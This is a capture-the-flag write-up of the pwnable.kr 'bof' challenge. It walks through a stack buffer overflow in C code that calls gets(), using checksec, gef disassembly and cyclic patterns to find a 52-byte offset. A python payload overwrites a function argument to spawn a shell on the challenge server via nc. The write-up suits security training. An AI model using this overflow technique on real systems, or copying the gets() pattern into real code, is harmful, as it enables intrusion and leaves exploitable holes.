# bof

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

There is a buffer overflow here at the `gets` call. Initially I thought I had to redirect code execution and perform some sort of ret2whatever. Looking at the executable securities:

```bash
checksec --file=bof             
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   70 Symbols        No    0               1               bof
```

With these executable securities, I don't see a way to get code execution with what's available. However, you don't have to overwrite the return pointer to get code execution, just `key`.

First, identify where you begin writing:

```
gef➤  disass func
Dump of assembler code for function func:
   0x0000062c <+0>:     push   ebp
   0x0000062d <+1>:     mov    ebp,esp
   0x0000062f <+3>:     sub    esp,0x48
   0x00000632 <+6>:     mov    eax,gs:0x14
   0x00000638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:    xor    eax,eax
   0x0000063d <+17>:    mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:    call   0x645 <func+25>
   0x00000649 <+29>:    lea    eax,[ebp-0x2c] <---------------- start of buffer
   0x0000064c <+32>:    mov    DWORD PTR [esp],eax
   0x0000064f <+35>:    call   0x650 <func+36>
   0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe <-------------- addr to overwrite
   0x0000065b <+47>:    jne    0x66b <func+63>
   0x0000065d <+49>:    mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:    call   0x665 <func+57>
   0x00000669 <+61>:    jmp    0x677 <func+75>
   0x0000066b <+63>:    mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:    call   0x673 <func+71>
   0x00000677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:    je     0x688 <func+92>
   0x00000683 <+87>:    call   0x684 <func+88>
   0x00000688 <+92>:    leave  
   0x00000689 <+93>:    ret
```

The address where you can begin writing as at 0x00000649. Verify this by inputting 4 A's after `overflow me : `:

```
gef➤  x/xw $ebp-0x2c
0xffffcd7c:     0x41414141
```

Now determine the address you need to overwrite.

```
gef➤  x/xw $ebp-0x2c
0xffffcd7c:     0x41414141
gef➤  x $ebp+0x8
0xffffcdb0:     0xdeadbeef
gef➤  p 0xffffcdb0 - 0xffffcd7c
$1 = 0x34 (52)
```

To verify this, I set a breakpoint just before the cmp instruction (0x00000654) and set a cyclic payload of 100 bytes.

```
gef➤  x/xw $ebp+0x8
0xffffcdb0:     0x6161616e
gef➤  pattern offset $ebp+0x8
[+] Searching for '$ebp+0x8'
[+] Found at offset 52 (little-endian search) likely
[+] Found at offset 49 (big-endian search)
```

Lastly, craft the payload with the desired overwrite. I did this in a python2.7 one-liner: `python2.7 -c "print 'A' * 52 + '\xbe\xba\xfe\xca'" > payload`

Run this against the remote server like:

```bash
$ (cat payload ; cat) | nc pwnable.kr 9000
```